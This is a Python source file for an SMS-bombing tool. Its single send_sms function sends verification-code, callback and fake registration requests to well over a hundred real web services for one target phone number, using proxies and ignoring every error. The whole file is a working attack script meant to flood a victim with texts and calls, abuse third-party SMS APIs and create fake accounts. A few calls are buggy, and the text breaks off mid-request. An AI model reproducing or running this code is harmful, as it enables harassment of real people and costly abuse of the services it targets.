import requests
import json
import datetime
import bombshot

global count
count = 0

# this mask idea is smart, props to FSystem88
def mask(raw_phone, phone_mask):

	if len(raw_phone) == phone_mask.count('#'):
		raw_phone_list = list(raw_phone)
		for i in raw_phone_list:
			phone_mask = phone_mask.replace("#", i, 1)
		return phone_mask
		print(phone_mask)

def send_sms(phone, name, surname, patronymic, latin_name, email, password, useragent, proxies = None):
	phone9 = phone[1:]

	try:
		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")

			requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":name,"surname":surname,
				"patronymic":patronymic, "sex":"m", "birthdate":"..", "phone": masked_phone, "email":"","city":""}, 
				proxies=proxies, timeout=10)
			
		except:
			pass

		try:
			requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone=mask(raw_phone=phone[1:], phone_mask="8(###)###-##-##")
			requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",
				data={"phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone=mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0", "step": 
				"phone","redirect": "/profile/","phone": masked_phone, "code":""}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://eda.yandex/api/v1/user/request_authentication_code", 
				json={"phone_number": "+" + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass
		try:
			requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone},
			 proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": surname,
				"firstName":name, "middleName":patronymic,"mobilePhone":phone, "email":email,
				"smsCode":""}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://shop.vsk.ru/ajax/auth/postSms/", 
				data={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone, "confirmationGDPRDate": 
				int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=10)
			requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}, 
				proxies=proxies, timeout=10) 
		except:
			pass

		try:

			masked_phone=mask(raw_phone=phone, phone_mask="#(###)###-##-##")
			requests.post("https://www.r-ulybka.ru/login/form_ajax.php", 
				data={"action":"auth","phone":masked_phone}, 
				proxies=proxies, timeout=10)

			masked_phone=mask(raw_phone=phone, phone_mask="+#(###)###-##-##")
			requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":masked_phone,
				"action":"sendSmsAgain"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": 
				"6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": 
				"6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": 
				"+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site", 
				"signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone=mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": masked_phone}, 
				proxies=proxies, 
				timeout=10)
		except:
			pass

		try:
			masked_phone=mask(raw_phone=phone, phone_mask="8(###)###-##-##")
			requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",
				data={"phone": masked_phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", 
				data={"phone_number": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,
				"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home",
				"launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://msk.tele2.ru/api/validation/number/" + phone, 
				json={"sender": "Tele2"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(phone, phone_mask="+# (###) ### - ## - ##")
			requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", 
				data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", 
				data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="(+#)##########")
			requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0",
				"userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": 
				{"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},
				"method": {"name": "sendSmsCode"},"data": {"phone": masked_phone, "type": 1}}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": 
				"GET_CODE","LOGIN": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, 
				"name": name}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="8(###)###-##-##")
			requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",
				data={"phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="8 (###) ###-##-##")
			requests.post("http://sushigourmet.ru/auth",data={"phone": masked_phone, "stage": 1}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1",
				"email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0, 
				"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0}, proxies=proxies, 
				timeout=10)
		except:
			pass

		try:
			requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="8-###-###-##-##")
			requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": 
				"restore_password","phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", 
				"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone=mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", 
				params={"phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
				data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://smart.space/api/users/request_confirmation_code/",
				json={"mobile": "+" + phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://shafa.ua/api/v3/graphiql",
				json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+" + phone},
				"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms",
				"variables": {"phoneNumber": "+" + phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": 
				{"login":phone9,"check":True,"crypto":{"captcha":"739699"}}}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",
				json={"phone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
				data={"phone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+#(###)###-##-##")
			requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
				data={"phone": masked_phone, "alien": "0"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
				params={"number": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
				json={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",
				headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params = 
				{"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.prosushi.ru/php/profile.php",
				data={"phone": "+"+phone, "mode": "sms"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+#-###-###-##-##")
			requests.post("https://api.pozichka.ua/v1/registration/send",
				json={"RegisterSendForm": {"phone": masked_phone}}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
				data={"AUTH_ACTION": "SEND_USER_CODE","phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
				data={"phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="8-###-###-##-##")
			requests.post("https://pizzasushiwok.ru/index.php",
				data={"mod_name": "call_me","task": "request_call","name": name,"phone": masked_phone}, proxies=proxies, 
				timeout=10)
		except:
			pass

		try:
			requests.post("https://pizzasinizza.ru/api/phoneCode.php", 
				json={"phone": phone9}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://pizzakazan.com/auth/ajax.php",
				data={"phone": "+"+phone, "method": "sendCode"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-####")
			requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": masked_phone}, proxies=proxies, 
				timeout=10)
		except:
			pass

		try:
			requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
				data={"telephone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+#-###-###-##-##")
			requests.post("https://paylate.ru/registry",
				data={"mobile": masked_phone,"first_name": name,"last_name": name,"nick_name": name,
				"gender-client": 1,"email": email,"action": "registry"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
				data={"telephone": "8"+phone9}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
				json={"phone": phone, "otpId": 0}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-####")
			requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",
				data={"name": "Auth.SendPassword", "params[0]": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.ollis.ru/gql",
				json={"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="8 (###) ###-##-##")
			requests.get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1","ajax": "1","name": name,
				"phone": masked_phone,"call_time": "1","pravila2": "on"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
				data={"st.r.phone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": 
				"bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": 
				phone,"code": "","sendsms": "Выслать код"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://auth.multiplex.ua/login", json={"login": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", 
				params={"msisdn": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name, 
				"phone": phone,"email": email}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",
				data={"name": name, "phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data={"+"+phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, 
				"CellPhone": phone, "Package": "optimal"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + phone,
				"klient_email": email}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ### ## ##")
			requests.get(f"http://mnogomenu.ru/office/password/reset/" + masked_phone, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+" + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio":name, "phone":phone, 
				"phone_number":"1"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", 
				data={"user_info[fullname]": name,"user_info[phone]": phone,
				"user_info[email]": email,"user_info[password]": password, 
				"user_info[conf_password]": password}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",
				data = {"phone": phone, "do": "phone"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# ### ### ## ##")
			requests.get("https://makimaki.ru/system/callback.php", params={"cb_fio": name, 
				"cb_phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", 
				data={"data": phone, "metod": "postreg"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
				json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle", 
				json={"url": "/api/client/phone_verification","method": "POST","data": 
				{"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": 
				{"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
				json={"phone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://koronapay.com/transfers/online/api/users/otps", 
				data={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",
				headers={"Agent": "website"},json={"Phone":phone, "Type": 1}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="# (###) ###-##-##")
			requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", 
				"data_type": "json"}, data = {"phone": masked_phone }, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
				json={"phone": "+" + phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://izi.ua/api/auth/register",json={"phone":"+" + phone,"name":name,
				"is_terms_accepted":True}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+## (###) ###-##-##")
			requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": masked_phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", 
				data = {"password": password,"application": "lkp","login": "+"+phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
				headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
				json={"Birthday": "1986-08-10T07:19:56.276+02:00",
				"DocIssueDate": "2004-03-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),
				"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,
				"SecondName": name,"Phone": phone9,"Email": email}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",
				data={"country": "RU","csrfmiddlewaretoken": "","phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
				data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown",
				"stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.imgur.com/account/v1/phones/verify",
				json={"phone_number": phone, "region_code": "RU"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
				data={"msisdn": phone,"locale": "en","countryCode": "ru",
				"version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://helsi.me/api/healthy/accounts/login",
				json={"phone": phone, "platform": "PISWeb"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,
				"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1",
				"REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",
				json={"phone": {"code": 1, "number": phone9}}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",
				json={"phone": "+" + phone,"grant_type": "password","client_id": "gcarAppMob",
				"client_secret": "SomeRandomCharsAndNumbersMobile"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://friendsclub.ru/assets/components/pl/connector.php", 
				data={"casePar": "authSendsms", "MobilePhone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,
				"phone": masked_phone,"g-recaptcha-response": ""}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode",
				"phone": phone9,"g-recaptcha-response": ""}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.flipkart.com/api/5/user/otp/generate",
				headers={"Origin": "https://www.flipkart.com",
				"X-user-agent": "{}"},
				data={"loginId": "+"+phone}, proxies=proxies, timeout=10).format(useragent)
		except:
			pass

		try:
			requests.post("https://www.flipkart.com/api/6/user/signup/status",
				headers={"Origin": "https://www.flipkart.com",
				"X-user-agent": "{}"},
				json={"loginId": "+"+phone, "supportAllStates": True}, proxies=proxies, timeout=10).format(useragent)
		except:
			pass

		try:
			requests.post("https://fix-price.ru/ajax/register_phone_code.php",
				data={"register_call": "Y", "action": "getCode", "phone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://findclone.ru/register", params={"phone": "+" + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.finam.ru/api/smslocker/sendcode",
				data={"phone": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://2407.smartomato.ru/account/session",
				json={"phone": masked_phone,"g-recaptcha-response": None}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://www.etm.ru/cat/runprog.html",
				data={"m_phone":phone9,"mode": "sendSms",
				"syf_prog": "clients-services","getSysParam": "yes"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://api.eldorado.ua/v1/sign/",
				params={"login": phone,"step": "phone-check","fb_id": "null",
				"fb_token": "null","lang": "ru"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+## (###) ###-##-##")
			requests.post("https://e-groshi.com/online/reg",
				data={"first_name": name,"last_name": name,"third_name": name,
				"phone": masked_phone,"password": password,"password2": password}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",
				data={"phone_or_email": "+"+phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.easypay.ua/api/auth/register",
				json={"phone": phone, "password": password}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://my.dianet.com.ua/send_sms/", 
				data={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",
				data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://api.creditter.ru/confirm/sms/send",
				json={"phone": masked_phone,"type": "register"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://clients.cleversite.ru/callback/run.php",
				data={"siteid": "62731","num":phone,"title": "Онлайн-консультант",
				"referrer": "https://m.cleversite.ru/call"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://city24.ua/personalaccount/account/registration",
				data={"PhoneNumber": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", 
				data={}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://cinema5.ru/api/phone_code",
				data={"phone": masked_phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
				json={"phone": "+" + phone, "type": "authenticateCode"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api.carsmile.com/",
				json={"operationName": "enterPhone","variables": {"phone": phone},
				"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",
				params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", 
				"usedapiversion": "3"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone=mask(raw_phone=phone9, phone_mask="(###)###-##-##")
			requests.post("https://bluefin.moscow/auth/register/",data={"phone": masked_phone, 
				"sendphone": "Далее"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": masked_phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://bamper.by/registration/?step=1",data={"phone": "+" + phone,
				"submit": "Запросить смс подтверждения","rules": "on"}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="(###) ###-##-##")
			requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": masked_phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://oauth.av.ru/check-phone", json={"phone": masked_phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
				data={"phone": phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			requests.post("https://apteka.ru/_action/auth/getForm/",
				data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "",
				"form[EMAIL]": "","form[LOGIN]": masked_phone, "form[PASSWORD]": password,
